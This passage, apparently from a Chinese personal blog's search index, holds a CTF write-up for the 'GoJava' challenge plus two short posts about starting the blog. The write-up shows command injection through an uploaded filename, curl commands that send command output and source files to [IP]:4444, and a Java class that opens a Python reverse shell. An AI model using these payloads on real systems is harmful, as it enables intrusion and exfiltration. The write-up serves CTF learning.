src="/2024/05/19/H-NCTF%E5%A4%8D%E7%8E%B0/Users\史小乐\AppData\Local\Temp\AgAABbWKMDsWNdOkNjhBh7wNdbPFULoV.png" alt="AgAABbWKMDsWNdOkNjhBh7wNdbPFULoV"></p><h2 id><a href="#" class="headerlink" title></a></h2><h4 id="GoJava"><a href="#GoJava" class="headerlink" title="GoJava"></a>GoJava</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">题面</span><br><span class="line">moran 凭借自己一坤天的代码学习，写了一个简单的在线 java 编译器，快来试试吧！</span><br><span class="line">tips:编译需要时间，请耐心等待</span><br><span class="line">flag在/root里。另外请细心寻找</span><br></pre></td></tr></table></figure><p>1.信息泄露了两个文件:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">robots.txt</span><br><span class="line">js</span><br></pre></td></tr></table></figure><p>访问robots.txt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: ./main-old.zip  可以看</span><br><span class="line"></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: ./main.go  看不了，被ban了</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">package main</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">&quot;io&quot;</span><br><span class="line">&quot;log&quot;</span><br><span class="line">&quot;mime/multipart&quot;</span><br><span class="line">&quot;net/http&quot;</span><br><span class="line">&quot;os&quot;</span><br><span class="line">&quot;strings&quot;</span><br><span class="line">)</span><br><span class="line">var blacklistChars = []rune&#123;&#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&quot;&#x27;, &#x27;\&#x27;&#x27;, &#x27;\\&#x27;, &#x27;?&#x27;, &#x27;*&#x27;, &#x27;&#123;&#x27;, &#x27;&#125;&#x27;, &#x27;\t&#x27;, &#x27;\n&#x27;, &#x27;\r&#x27;&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">// 设置路由</span><br><span class="line">http.HandleFunc(&quot;/gojava&quot;, compileJava)</span><br><span class="line"></span><br><span class="line">// 设置静态文件服务器</span><br><span class="line">fs := http.FileServer(http.Dir(&quot;.&quot;))</span><br><span class="line">http.Handle(&quot;/&quot;, fs)</span><br><span class="line"></span><br><span class="line">// 启动服务器</span><br><span class="line">log.Println(&quot;Server started on :80&quot;)</span><br><span class="line">log.Fatal(http.ListenAndServe(&quot;:80&quot;, nil))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func isFilenameBlacklisted(filename string) bool &#123;</span><br><span class="line">for _, char := range filename &#123;</span><br><span class="line">for _, blackChar := range blacklistChars &#123;</span><br><span class="line">if char == blackChar &#123;</span><br><span class="line">return true</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">return false</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func compileJava(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">// 检查请求方法是否为POST</span><br><span class="line">if r.Method != http.MethodPost &#123;</span><br><span class="line">http.Error(w, &quot;Method not allowed&quot;, http.StatusMethodNotAllowed)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 解析multipart/form-data格式的表单数据</span><br><span class="line">err := r.ParseMultipartForm(10 &lt;&lt; 20) // 设置最大文件大小为10MB</span><br><span class="line">if err != nil &#123;</span><br><span class="line">http.Error(w, &quot;Error parsing form&quot;, http.StatusInternalServerError)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 从表单中获取上传的文件</span><br><span class="line">file, handler, err := r.FormFile(&quot;file&quot;)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">http.Error(w, &quot;Error retrieving file&quot;, http.StatusBadRequest)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">defer file.Close()</span><br><span class="line"></span><br><span class="line">if isFilenameBlacklisted(handler.Filename) &#123;</span><br><span class="line">http.Error(w, &quot;Invalid filename: contains blacklisted character&quot;, http.StatusBadRequest)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">if !strings.HasSuffix(handler.Filename, &quot;.java&quot;) &#123;</span><br><span class="line">http.Error(w, &quot;Invalid file format, please select a .java file&quot;, http.StatusBadRequest)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">err = saveFile(file, &quot;./upload/&quot;+handler.Filename)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">http.Error(w, &quot;Error saving file&quot;, http.StatusInternalServerError)</span><br><span class="line">return</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func saveFile(file multipart.File, filePath string) error &#123;</span><br><span class="line">// 创建目标文件</span><br><span class="line">f, err := os.Create(filePath)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">return err</span><br><span class="line">&#125;</span><br><span class="line">defer f.Close()</span><br><span class="line"></span><br><span class="line">// 将上传的文件内容复制到目标文件中</span><br><span class="line">_, err = io.Copy(f, file)</span><br><span class="line">if err != nil &#123;</span><br><span class="line">return err</span><br><span class="line">&#125;</span><br><span class="line">return nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到对上传的文件名是有过滤的，我们可以尝试用文件名进行RCE</p><p>但是我没弹过来😿🥹🥹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">------WebKitFormBoundaryujTPRyD0Ol0dP4y8</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.java||curl -X POST -d a=`whoami` [IP]:4444||.java&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundaryujTPRyD0Ol0dP4y8--</span><br><span class="line">看文件夹</span><br><span class="line">a.java||curl -X POST -d a=`ls|base64 -w 0` [IP]:4444||.java</span><br><span class="line"></span><br><span class="line">Y3NzCmZpbmFsCmdvLm1vZApnb2phdmEKaW5kZXguaHRtbApqcwptYWluLW9sZC56aXAKbWFpbi5nbwpyb2JvdHMudHh0CnVwbG9hZAo=</span><br><span class="line"> 解码得到</span><br><span class="line">css</span><br><span class="line">final</span><br><span class="line">go.mod</span><br><span class="line">gojava</span><br><span class="line">index.html</span><br><span class="line">js</span><br><span class="line">main-old.zip</span><br><span class="line">main.go</span><br><span class="line">robots.txt</span><br><span class="line">upload</span><br><span class="line"></span><br><span class="line">拿一下main.go</span><br><span class="line">a.java||curl -X POST -d a=`base64 -w 0 main.go` [IP]:4444||.java</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line">import (</span><br><span class="line">    &quot;fmt&quot;</span><br><span class="line">    &quot;io&quot;</span><br><span class="line">    &quot;log&quot;</span><br><span class="line">    &quot;math/rand&quot;</span><br><span class="line">    &quot;mime/multipart&quot;</span><br><span class="line">    &quot;net/http&quot;</span><br><span class="line">    &quot;os&quot;</span><br><span class="line">    &quot;os/exec&quot;</span><br><span class="line">    &quot;path/filepath&quot;</span><br><span class="line">    &quot;strconv&quot;</span><br><span class="line">    &quot;strings&quot;</span><br><span class="line">    &quot;time&quot;</span><br><span class="line">)</span><br><span class="line"> </span><br><span class="line">var blacklistChars = []rune&#123;&#x27;&lt;&#x27;, &#x27;&gt;&#x27;, &#x27;&quot;&#x27;, &#x27;\&#x27;&#x27;, &#x27;\\&#x27;, &#x27;?&#x27;, &#x27;*&#x27;, &#x27;&#123;&#x27;, &#x27;&#125;&#x27;, &#x27;\t&#x27;, &#x27;\n&#x27;, &#x27;\r&#x27;&#125;</span><br><span class="line"> </span><br><span class="line">func main() &#123;</span><br><span class="line">    // 设置路由</span><br><span class="line">    http.HandleFunc(&quot;/gojava&quot;, compileJava)</span><br><span class="line">    http.HandleFunc(&quot;/testExecYourJarOnServer&quot;, testExecYourJarOnServer)</span><br><span class="line"> </span><br><span class="line">    // 设置静态文件服务器</span><br><span class="line">    fs := http.FileServer(http.Dir(&quot;.&quot;))</span><br><span class="line">    http.Handle(&quot;/&quot;, http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">        // 检查请求的路径是否需要被禁止访问</span><br><span class="line">        if isForbiddenPath(r.URL.Path) &#123;</span><br><span class="line">            http.Error(w, &quot;Forbidden&quot;, http.StatusForbidden)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        // 否则，继续处理其他请求</span><br><span class="line">        fs.ServeHTTP(w, r)</span><br><span class="line">    &#125;))</span><br><span class="line"> </span><br><span class="line">    // 启动服务器</span><br><span class="line">    log.Println(&quot;Server started on :80&quot;)</span><br><span class="line">    log.Fatal(http.ListenAndServe(&quot;:80&quot;, nil))</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">func isForbiddenPath(path string) bool &#123;</span><br><span class="line">    // 检查路径是否为某个特定文件或文件夹的路径</span><br><span class="line">    // 这里可以根据你的需求进行设置</span><br><span class="line">    forbiddenPaths := []string&#123;</span><br><span class="line">        &quot;/main.go&quot;,</span><br><span class="line">        &quot;/upload/&quot;,</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 检查请求的路径是否与禁止访问的路径匹配</span><br><span class="line">    for _, forbiddenPath := range forbiddenPaths &#123;</span><br><span class="line">        if strings.HasPrefix(path, forbiddenPath) &#123;</span><br><span class="line">            return true</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    return false</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">func isFilenameBlacklisted(filename string) bool &#123;</span><br><span class="line">    for _, char := range filename &#123;</span><br><span class="line">        for _, blackChar := range blacklistChars &#123;</span><br><span class="line">            if char == blackChar &#123;</span><br><span class="line">                return true</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return false</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">// compileJava 处理上传并编译Java文件的请求</span><br><span class="line">func compileJava(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">    // 检查请求方法是否为POST</span><br><span class="line">    if r.Method != http.MethodPost &#123;</span><br><span class="line">        http.Error(w, &quot;Method not allowed&quot;, http.StatusMethodNotAllowed)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 解析multipart/form-data格式的表单数据</span><br><span class="line">    err := r.ParseMultipartForm(10 &lt;&lt; 20) // 设置最大文件大小为10MB</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        http.Error(w, &quot;Error parsing form&quot;, http.StatusInternalServerError)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 从表单中获取上传的文件</span><br><span class="line">    file, handler, err := r.FormFile(&quot;file&quot;)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        http.Error(w, &quot;Error retrieving file&quot;, http.StatusBadRequest)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line">    defer file.Close()</span><br><span class="line"> </span><br><span class="line">    if isFilenameBlacklisted(handler.Filename) &#123;</span><br><span class="line">        http.Error(w, &quot;Invalid filename: contains blacklisted character&quot;, http.StatusBadRequest)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 检查文件扩展名是否为.java</span><br><span class="line">    if !strings.HasSuffix(handler.Filename, &quot;.java&quot;) &#123;</span><br><span class="line">        http.Error(w, &quot;Invalid file format, please select a .java file&quot;, http.StatusBadRequest)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 保存上传的文件至./upload文件夹</span><br><span class="line">    err = saveFile(file, &quot;./upload/&quot;+handler.Filename)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        http.Error(w, &quot;Error saving file&quot;, http.StatusInternalServerError)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 生成随机文件名</span><br><span class="line">    rand.Seed(time.Now().UnixNano())</span><br><span class="line">    randomName := strconv.FormatInt(rand.Int63(), 16) + &quot;.jar&quot;</span><br><span class="line"> </span><br><span class="line">    // 编译Java文件</span><br><span class="line">    cmd := &quot;javac ./upload/&quot; + handler.Filename</span><br><span class="line">    compileCmd := exec.Command(&quot;sh&quot;, &quot;-c&quot;, cmd)</span><br><span class="line">    //compileCmd := exec.Command(&quot;javac&quot;, &quot;./upload/&quot;+handler.Filename)</span><br><span class="line">    compileOutput, err := compileCmd.CombinedOutput()</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        http.Error(w, &quot;Error compiling Java file: &quot;+string(compileOutput), http.StatusInternalServerError)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 将编译后的.class文件打包成.jar文件</span><br><span class="line">    fileNameWithoutExtension := strings.TrimSuffix(handler.Filename, filepath.Ext(handler.Filename))</span><br><span class="line">    jarCmd := exec.Command(&quot;jar&quot;, &quot;cvfe&quot;, &quot;./final/&quot;+randomName, fileNameWithoutExtension, &quot;-C&quot;, &quot;./upload&quot;, strings.TrimSuffix(handler.Filename, &quot;.java&quot;)+&quot;.class&quot;)</span><br><span class="line">    jarOutput, err := jarCmd.CombinedOutput()</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        http.Error(w, &quot;Error creating JAR file: &quot;+string(jarOutput), http.StatusInternalServerError)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 返回编译后的.jar文件的下载链接</span><br><span class="line">    fmt.Fprintf(w, &quot;/final/%s&quot;, randomName)</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">// saveFile 保存上传的文件</span><br><span class="line">func saveFile(file multipart.File, filePath string) error &#123;</span><br><span class="line">    // 创建目标文件</span><br><span class="line">    f, err := os.Create(filePath)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        return err</span><br><span class="line">    &#125;</span><br><span class="line">    defer f.Close()</span><br><span class="line"> </span><br><span class="line">    // 将上传的文件内容复制到目标文件中</span><br><span class="line">    _, err = io.Copy(f, file)</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        return err</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    return nil</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">func testExecYourJarOnServer(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">    jarFile := &quot;./final/&quot; + r.URL.Query().Get(&quot;jar&quot;)</span><br><span class="line"> </span><br><span class="line">    // 检查是否存在指定的.jar文件</span><br><span class="line">    if !strings.HasSuffix(jarFile, &quot;.jar&quot;) &#123;</span><br><span class="line">        http.Error(w, &quot;Invalid jar file format&quot;, http.StatusBadRequest)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if _, err := os.Stat(jarFile); os.IsNotExist(err) &#123;</span><br><span class="line">        http.Error(w, &quot;Jar file not found&quot;, http.StatusNotFound)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 执行.jar文件</span><br><span class="line">    cmd := exec.Command(&quot;java&quot;, &quot;-jar&quot;, jarFile)</span><br><span class="line">    output, err := cmd.CombinedOutput()</span><br><span class="line">    if err != nil &#123;</span><br><span class="line">        http.Error(w, &quot;Error running jar file: &quot;+string(output), http.StatusInternalServerError)</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    // 输出结果</span><br><span class="line">    w.Header().Set(&quot;Content-Type&quot;, &quot;text/plain&quot;)</span><br><span class="line">    w.Write(output)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"> 可以发现有一个接口testExecYourJarOnServer用于在服务器上运行jar文件，可以构造java代码</span><br><span class="line"># ExecuteSystemCommand.java</span><br><span class="line"></span><br><span class="line">import java.io.BufferedReader;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line">public class ExecuteSystemCommand &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        String[] cmd = &#123; &quot;python3&quot;, &quot;-c&quot;,</span><br><span class="line">                &quot;import os,pty,socket;s=socket.socket();s.connect((\&quot;[IP]\&quot;,4444));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\&quot;bash\&quot;)&quot; &#125;;</span><br><span class="line"></span><br><span class="line">        ProcessBuilder processBuilder = new ProcessBuilder(cmd);</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            Process process = processBuilder.start();</span><br><span class="line"></span><br><span class="line">            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            while ((line = reader.readLine()) != null) &#123;</span><br><span class="line">                System.out.println(line);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            int exitCode = process.waitFor();</span><br><span class="line">            System.out.println(&quot;Exited with code: &quot; + exitCode);</span><br><span class="line">        &#125; catch (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;访问接口</span><br><span class="line">http://hnctf.imxbt.cn:27984/testExecYourJarOnServer?jar=429e7d2610c50acb.jar成功拿到shell</span><br><span class="line">在根目录可以找到/memorandum文件，翻译是备忘录</span><br><span class="line">cat /memorandum        </span><br><span class="line">AsdDABG</span><br><span class="line">猜测是密码，尝试登录</span><br><span class="line">su</span><br><span class="line">Password  AsdDABG</span><br><span class="line">登录成功，拿flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Start</title>
      <link href="/2024/05/19/Start/"/>
      <url>/2024/05/19/Start/</url>
      
        <content type="html"><![CDATA[<p>来由：昨天在学习的时候，意外看到了好多厉害的师傅们都有一个自己的博客，来记录自己的生活以及学习笔记等等，虽然我之前也一直想做这件事情但始终没有行动，那既然又遇到了，那就开始搭建一个属于自己的博客吧，开创一个属于自己的小窝，欸嘿!</p><p>搭建博客过程中遇到的几个小问题:<br>1.之前已经装过nodejs了，不知道路径，这样可以查到具体路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Windows查询:</span><br><span class="line">where node</span><br><span class="line">where npm</span><br><span class="line">Bash查询:</span><br><span class="line">which node</span><br><span class="line">which npm</span><br></pre></td></tr></table></figure><p>2.输入 npm install -g hexo-cli的时候，需要以管理员身份运行</p><p>毕竟每个人遇到的问题都可能不太一样，到时候，希望大家耐心搭建，一定坚持下去呀。</p><p>参考博客：<a href="https://blog.csdn.net/sinat_37781304/article/details/82729029">https://blog.csdn.net/sinat_37781304/article/details/82729029</a></p><p><a href="https://blog.csdn.net/ItDaChuang/article/details/111261426">https://blog.csdn.net/ItDaChuang/article/details/111261426</a></p><p>今后就正式开始以博客的形式来记录啦，希望能够看到自己的成长吧。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>paper</title>
      <link href="/2024/05/19/paper/"/>
      <url>/2024/05/19/paper/</url>
      
        <content type="html"><![CDATA[<p>Fighting!!1</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
